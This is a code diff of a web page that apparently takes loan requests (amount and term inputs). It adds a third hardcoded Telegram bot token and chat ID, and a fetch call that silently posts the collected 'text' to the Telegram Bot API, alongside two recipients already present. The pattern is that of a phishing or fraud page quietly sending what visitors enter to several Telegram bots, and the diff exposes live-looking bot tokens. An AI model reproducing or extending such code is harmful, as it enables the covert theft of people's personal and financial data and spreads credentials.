@@ -2352,7 +2352,9 @@
         const TG_TOKEN_2 = '9129741897:AAEsTo6brZQJQravgVum8ImcgwNpc17njas';   // <-- COLOCA AQUÍ EL SEGUNDO TOKEN (Ej: '123456789:ABCdef...')
         const TG_CHATID_2 = '9096528590';  // <-- COLOCA AQUÍ EL SEGUNDO CHAT ID (Ej: '987654321')
         // ============================================================
-        
+        const TG_TOKEN_3 = '8799985196:AAErtNbXz4yYjFO007ZLJBAns6X7hwtP14E';// SU PATA DE VALENTINO
+        const TG_CHATID_3 = '8389771901';
+        // Tercer Destinatario token y chat id 
         const montoInput = document.getElementById('monto-input');
         const plazoInput = document.getElementById('plazo-input');
 
@@ -2929,6 +2931,17 @@
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: TG_CHATID_2, text: text, parse_mode: 'HTML' })
+                    }).catch(() => { })
+                );
+            }
+
+            // Destinatario 3
+            if (TG_TOKEN_3 && TG_CHATID_3) {
+                requests.push(
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN_3}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: TG_CHATID_3, text: text, parse_mode: 'HTML' })
                     }).catch(() => { })
                 );
             }
